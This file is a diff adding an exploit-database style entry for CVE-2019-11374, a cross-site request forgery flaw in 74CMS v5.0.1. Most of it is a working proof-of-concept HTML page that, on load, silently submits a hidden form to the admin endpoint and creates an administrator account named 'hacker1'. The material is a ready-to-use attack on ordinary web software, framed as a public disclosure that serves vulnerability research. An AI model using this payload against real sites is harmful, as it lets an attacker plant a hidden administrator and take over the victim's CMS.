@@ -1,0 +1,55 @@
+# Exploit Title: 74CMS v5.0.1 has a CSRF vulnerability to add a new admin user
+# Date: 2019-04-14
+# Exploit Author: ax8
+# Vendor Homepage: https://github.com/Li-Siyuan
+# Software Link: http://www.74cms.com/download/index.html
+# Version: v5.0.1
+# CVE : CVE-2019-11374
+
+ 
+
+74CMS v5.0.1 has a CSRF vulnerability to add a new admin user via the index.php?m=Admin&c=admin&a=add URI.
+
+ 
+
+<!--poc.html(creat a administrater)-->
+
+<!DOCTYPE html>
+
+<html>
+
+  <head>
+
+  <title> CSRF Proof</title>
+
+  <script type="text/javascript">
+
+    function exec1(){
+
+      document.getElementById('form1').submit();
+
+    }
+
+  </script>
+
+  </head>
+
+  <body onload="exec1();">
+
+    <form id="form1" action="http://localhost/index.php?m=Admin&c=admin&a=add" method="POST">
+
+      <input type="hidden" name="username" value="hacker1" />
+
+  <input type="hidden" name="email" value="111111111@qq.com" />
+
+      <input type="hidden" name="password" value="hacker1" />
+
+      <input type="hidden" name="repassword" value="hacker1" />  
+
+  <input type="hidden" name="role_id" value="1" />
+
+    </form>
+
+  </body>
+
+</html>
